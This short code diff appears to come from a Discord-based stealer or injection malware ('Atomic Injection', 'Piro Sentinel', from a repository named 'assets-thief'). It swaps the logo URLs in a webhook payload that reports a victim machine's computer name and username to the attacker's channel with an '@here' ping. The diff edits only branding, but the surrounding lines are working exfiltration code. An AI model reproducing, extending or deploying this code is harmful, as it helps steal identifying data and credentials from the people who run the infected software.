@@ -7875,7 +7875,7 @@ const username = os.userInfo().username;
               var payload = JSON.stringify({
                 username: "Atomic Injection",
                 avatar_url:
-                  "https://raw.githubusercontent.com/freeman649/assets-thief/main/logo/image_3.png",
+                  "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
                   content: "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
                 embeds: [
                   {
@@ -7884,7 +7884,7 @@ const username = os.userInfo().username;
                     footer: {
                       text: "@Piro Sentinel | https://discord.gg/e8xACqzUvU",
                       icon_url:
-                        "https://raw.githubusercontent.com/freeman649/assets-thief/main/logo/image_3.png",
+                        "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
                     },
                     fields: [
                       {
